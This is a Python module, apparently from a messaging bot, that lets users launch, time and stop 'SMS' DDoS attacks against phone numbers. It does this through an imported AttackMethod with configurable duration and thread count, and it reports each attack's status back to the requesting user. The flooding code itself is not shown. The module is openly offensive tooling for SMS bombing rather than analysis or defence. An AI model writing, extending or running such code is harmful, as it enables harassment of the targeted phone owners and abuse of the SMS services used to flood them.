from threading import Timer

from processing.start_ddos import AttackMethod
from settings.response_info import info
from tools.api import messages_send

ddos_dict = dict()


def call_ddos_number(user_id: str, number: str, time: int, threads: int):
    if user_id not in ddos_dict:
        ddos_dict[user_id] = {number: AttackMethod(name='SMS', duration=time, threads=threads, target=number)}
    else:
        ddos_dict[user_id].update({number: AttackMethod(name='SMS', duration=time, threads=threads, target=number)})
    end_thread = Timer(time, __end_ddos_number, (ddos_dict, user_id, number))
    end_thread.start()
    messages_send(user_id, info['str_ddos'].format(number, time, threads))
    ddos_dict[user_id][number].Start()


def __end_ddos_number(ddos_dict: dict(), user_id, pr_number) -> None:
    if user_id in ddos_dict:
        if pr_number in ddos_dict[user_id]:
            del ddos_dict[user_id][pr_number]
            if len(ddos_dict[user_id]) == 0:
                del ddos_dict[user_id]
            messages_send(user_id, info['stp_ddos'].format('+7' + pr_number))


def stop_ddos_number(user_id: str, number: str):
    if user_id in ddos_dict:
        if number in ddos_dict[user_id]:
            # Switch off ddos for user_id and number
            ddos_dict[user_id][number].is_running = False
            del ddos_dict[user_id][number]
            if len(ddos_dict[user_id]) == 0:
                del ddos_dict[user_id]
            messages_send(user_id, info['dis_ddos'].format(number))
            return
    messages_send(user_id, info['not_num_in_dict'].format(number))


def get_ddos_numbers_by_user_id(user_id) -> dict or None:
    if user_id in ddos_dict:
        print(ddos_dict)
        return ddos_dict[user_id]
    return None


def parse_number(number: str) -> str or None:
    if number.startswith('+8') and len(number) == 12:
        return None
    elif number.startswith('+'):
        return number[1:]
    else:
        return None
